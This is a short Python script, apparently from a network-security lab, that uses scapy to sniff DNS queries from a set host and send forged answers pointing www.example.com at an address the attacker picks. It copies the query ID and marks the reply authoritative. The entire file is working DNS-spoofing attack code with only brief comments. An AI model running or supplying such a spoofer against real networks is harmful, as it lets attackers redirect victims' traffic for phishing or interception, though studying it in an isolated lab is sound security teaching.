#!/usr/bin/env python3
from scapy.all import *


def spoof_dns(pkt):
    if DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8'):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))

        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                       ttl=259200, rdata='4.5.6.3')

        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                     qdcount=1, ancount=1, an=Anssec)

        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt / UDPpkt / DNSpkt
        send(spoofpkt)


# Sniff UDP query packets and invoke spoof_dns().
myFilter = "udp and (src host 10.9.0.5 and dst port 53)"  # Set the filter
pkt = sniff(iface='br-7b78c2a5d8de', filter=myFilter, prn=spoof_dns)
